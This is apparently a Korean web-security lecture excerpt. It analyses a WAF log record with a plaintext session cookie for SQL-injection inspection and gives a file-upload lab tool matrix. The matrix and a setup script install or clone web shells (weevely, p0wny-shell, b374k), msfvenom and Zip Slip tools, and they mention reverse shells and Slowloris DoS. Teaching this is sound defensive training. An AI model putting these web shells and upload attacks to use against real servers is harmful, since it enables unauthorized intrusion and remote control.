> **해석 팁.** Community 버전은 **Intruder 속도 제한**이 있어 대량 브루트포스는 비현실적. 취약점 재현과 보고서 증적 확보에 집중.

---

## 실제 사례 (WitFoo Precinct 6 — WAF POST 입력 처리 단면)

> 출처: WitFoo Precinct 6 Cybersecurity Dataset (Apache 2.0)
> 본 lecture *SQLi 점검* 학습 항목 (입력값 처리·WAF 차단·세션 cookie 노출) 에 매핑되는 dataset 의 WAF POST 88건 중 대표 record.

### Case 1: WAF POST 1건 — JSESSIONID 노출 + 200 outcome

**원본 발췌**:

```text
<190>Jul 26 06:24:30 USER-0010-4334 CEF:0|USER-0010-57562|WAF|1220|1000|POST|5|
  cat=TR dvc=10.208.162.175 src=100.64.1.67 spt=51071 dst=10.0.145.98
  USER-9484Cookies=JSESSIONID\=9569E23CF0614F9EF9C81DD49E4C5608
  outcome=200 USER-9484Method=POST in=1173 out=29521
```

**dataset 의 POST 통계**

| 항목 | 값 |
|------|---|
| 총 POST 건수 | 88 (전체 GET 4018 의 2.2%) |
| 동일 src `100.64.1.67` 의 outcome 분포 | 200 (정상) + 302 (redirect) 혼재 |
| `USER-9484Cookies=JSESSIONID\=...` | 모든 POST 에 출현 — 세션 토큰이 *log 에 평문 기록* |

**해석 — 본 lecture 와의 매핑**

| SQLi/입력값 점검 학습 항목 | 본 record 에서의 증거 |
|--------------------------|---------------------|
| **입력값 검증 layer** | WAF (signature 1220/1000) 가 1차 검증 — 점검 시 *어느 layer 가 어떤 SQLi pattern 을 잡는지* 매핑 표 작성 |
| **세션 토큰 노출** | `JSESSIONID\=9569E23CF0614F9EF9C81DD49E4C5608` 가 WAF log 에 평문 기록 — *log access 권한 가진 내부 사용자가 세션 hijack 가능* (점검 항목으로 추가) |
| **POST body in/out 크기** | `in=1173 out=29521` — 입력 1.1KB → 응답 28.8KB. SQLi blind/UNION 시 응답 크기 차이로 *boolean inference* 가능 (timing 외 size 기반 점검) |
| **outcome=200** | WAF 가 통과시킨 POST → *WAF 룰셋 미커버 패턴* 존재 추정. 점검 시 *룰셋 버전·last_updated* 기록 필수 |

**SQLi 점검 액션**:
1. WAF audit log 의 cookie 평문 노출 → *log redaction* 점검 항목 추가 (개인정보보호법 위반 소지)
2. POST body 크기 *baseline 분포* 측정 후 ±3σ 이상 outlier 를 SQLi 후보로 분류
3. 룰셋 1220/1000 (WAF vendor signature) 의 *SQLi 커버리지* 표 — vendor doc 참조 → 미커버 pattern (예: NoSQL injection·LDAP injection) 별도 점검




---

## 부록: 학습 OSS 도구 매트릭스 (lab week05 — 파일 업로드)

| step | 카테고리 | 핵심 도구 |
|---|---|---|
| 1 식별 | curl + grep file input / **gobuster -p upload** / Burp Spider / nuclei -tags upload |
| 2 허용 유형 | form accept / curl 다양 확장자 / **SecLists** / Burp Intruder fuzzing |
| 3 이중 확장자 | 5 패턴 (이중/역순/null/case/변형) / 서버별 파싱표 / **Burp + PayloadsAllTheThings** / wfuzz |
| 4 Content-Type | curl -F type= / Burp Repeater multipart / Python requests / 변조 변형표 |
| 5 매직 바이트 | magic byte 표 / printf 결합 / **exiftool comment** / polyglot |
| 6 웹쉘 | 1줄 PHP / **weevely** / **p0wny-shell** / **b374k** / **msfvenom** / 다언어 표 |
| 7 이미지 코드 | exiftool / **steghide** / polyglot (GIFAR/JPG+ZIP/SVG) / GIF-PHP / ImageTragick |
| 8 ZIP | **evilarc Zip Slip** / 수동 zip / Zip Bomb DoS / symlink / JAR Tomcat |
| 9 경로 추측 | 경로 패턴 표 / gobuster / ffuf / 응답 분석 / 정상 이미지 URL |
| 10 RCE 검증 | curl ?c=cmd / weevely / **msfconsole handler** / netcat reverse / linpeas |
| 11 크기 제한 | dd 다양 / **Content-Length 변조** / chunked encoding / Slowloris DoS |
| 12 권한 | ls -la + getfacl / Apache .htaccess / Nginx location / **noexec mount** |
| 13 안전 구현 | **7층 방어** / python-magic / **ClamAV** / **ImageMagick re-encode** / S3 boto3 |
| 14 모니터링 | **Wazuh FIM** / auditd / **inotifywait + clamscan** / ModSecurity / **Falco** / VirusTotal API |
| 15 verification | 자동 보고서 / 위험도 표 / 도구 list / sha256 |

### 학생 환경 준비
```bash
sudo apt install -y weevely msfvenom exiftool steghide clamav clamav-daemon \
                    inotify-tools auditd python3-magic
git clone --depth 1 https://github.com/ptoomey3/evilarc ~/evilarc
git clone --depth 1 https://github.com/flozz/p0wny-shell ~/p0wny
git clone --depth 1 https://github.com/b374k/b374k ~/b374k
# Falco: docker run -d --name falco falcosecurity/falco
# imagemagick: sudo apt install imagemagick (re-encode 용)
```
